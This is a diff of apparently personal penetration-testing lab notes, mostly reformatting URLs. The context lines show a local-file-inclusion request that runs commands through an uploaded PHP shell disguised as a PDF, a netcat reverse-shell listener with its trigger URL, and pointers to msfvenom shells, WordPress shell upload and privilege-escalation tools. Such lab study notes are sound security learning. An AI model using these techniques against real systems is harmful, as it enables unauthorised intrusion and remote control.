@@ -642,7 +642,7 @@ Inject a file -> Submit allows to upload a pdf. Create a file that has a pdf hea
 
 that goes to upload page and can trigger a command
 
-    http://10.0.2.8/index.php?page=uploads/shell.pdf%00&cmd=whoami
+http://10.0.2.8/index.php?page=uploads/shell.pdf%00&cmd=whoami
 
 Shellcode to create a reverse shell
 
@@ -652,8 +652,9 @@ Get the php file and change the ip and port where the shell should connect to.
 
     nc -nvlp 4444
 
-    In Browser:
-    http://10.0.2.8/index.php?page=uploads/reverseshell.pdf%00
+In Browser:
+
+http://10.0.2.8/index.php?page=uploads/reverseshell.pdf%00
 
 *Privilage Escalation*
 
@@ -665,7 +666,7 @@ Host a file yourself and let the victim download it
 
 *Damn Vulnerable Web Application (DVWA)*
 
-    http://www.dvwa.co.uk/
+http://www.dvwa.co.uk/
 
 *Generate Reverse shell msfvenom*
 
@@ -754,18 +755,18 @@ Guides for privilege Escalation
 
 Basic Pentesting 1 OVA
 
-    https://www.vulnhub.com/entry/basic-pentesting-1,216/ 
+https://www.vulnhub.com/entry/basic-pentesting-1,216/ 
 
 
 *Guides*
 
 Windows
 
-    https://www.fuzzysecurity.com/tutorials/16.html 
+https://www.fuzzysecurity.com/tutorials/16.html 
 
 Linux
 
-    https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
 
 
 *Admin Shell upload - Wordpress*
@@ -777,7 +778,7 @@ Will create a reverse shell with a php shell and cleanup on its own. Need Wordpr
 
 *Linuxprivchecker*
 
-    https://github.com/GammaG/linuxprivchecker
+https://github.com/GammaG/linuxprivchecker
 
 Then put in it apache directory. On the target machine make a file transfer to pull this.
 This is the python version, but there are alternative versions.
@@ -895,7 +896,7 @@ Make files downloadable
 
 *Priviledge Check*
 
-https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+https://github.com/GammaG/linuxprivchecker
 
 
 
